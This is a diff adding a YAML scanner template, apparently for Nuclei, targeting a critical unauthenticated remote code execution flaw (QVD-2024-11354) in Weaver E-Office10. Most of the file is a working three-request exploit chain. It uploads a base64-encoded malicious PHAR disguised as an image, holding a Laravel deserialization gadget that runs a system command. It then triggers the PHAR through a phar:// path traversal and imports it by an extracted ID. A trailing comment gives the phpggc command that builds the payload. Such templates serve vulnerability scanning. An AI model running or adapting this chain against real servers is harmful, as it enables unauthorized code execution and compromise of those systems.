@@ -1,0 +1,65 @@
+id: QVD-2024-11354 
+info:
+  name: weaver-eoffice-attachment-RCE
+  author: apple
+  severity: critical
+  description: 泛微E-Office10远程代码执行漏洞(QVD-2024-11354)在互联网上公开，由于系统处理上传的PHAR文件时存在缺陷，未经身份验证的远程攻击者能够上传伪装的恶意PHAR文件到服务器，从而在目标服务器上执行任意代码。
+  reference:
+    - https://mp.weixin.qq.com/s/nXg-2YF-iOMZW4mfDBYJYQ
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEE-Office10%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8Ev10.0_20240222%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+    - https://peiqif4ck.github.io/penetrationtest/2024/03/articles/b8f9d080e95e9930/
+    - https://mp.weixin.qq.com/s/iUar4ccwbNWHIyua3S7qoA
+  tags: eoffice
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Length: 621
+        Content-Type: multipart/form-data; boundary=8b69250ee9e3f346919440c2c7937ceb
+
+        --8b69250ee9e3f346919440c2c7937ceb
+        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+        Content-Type: image/jpeg
+
+        {{base64_decode("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp6AQAAAQAAABEAAAABAAAAAABEAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czozOiJkaXIiO319CAAAAHRlc3QudHh0BAAAAAAAAAAEAAAADH5/2KQBAAAAAAAAdGVzdFeypsmECtP8pfPuup3ghR41dJKdAgAAAEdCTUI=")}}
+        --8b69250ee9e3f346919440c2c7937ceb--
+      - |-
+        POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 69
+
+        source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+      - |-
+        POST /eoffice10/server/public/api/empower/import HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Length: 47
+        Content-Type: application/x-www-form-urlencoded
+
+        type=tttt&file={{eoffice_id}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <DIR>
+    extractors:
+      - type: regex
+        name: eoffice_id
+        internal: true
+        part: body_1
+        regex:
+          - '([a-fA-F0-9]{32})'  
+#生成phar数据：phpggc -p phar Laravel/RCE9 system dir|base64 -w 0
